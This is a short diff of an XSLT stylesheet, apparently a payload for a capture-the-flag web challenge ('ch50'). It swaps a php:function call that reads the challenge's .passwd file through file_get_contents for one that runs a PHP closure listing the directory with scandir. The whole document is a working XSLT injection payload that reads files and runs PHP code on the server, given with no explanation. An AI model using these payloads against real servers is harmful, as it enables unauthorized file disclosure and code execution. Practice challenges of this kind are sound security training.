@@ -3,7 +3,10 @@
 
 
    
-    
-<xsl:value-of select="php:function('file_get_contents','/challenge/web-serveur/ch50/.passwd')" />
-    </xsl:template>
+   <xsl:value-of select="php:function('call_user_func', function(){
+    return print_r(scandir('/challenge/web-serveur/ch50'), true);
+})"/> 
+
+   
+   </xsl:template>
 </xsl:stylesheet>
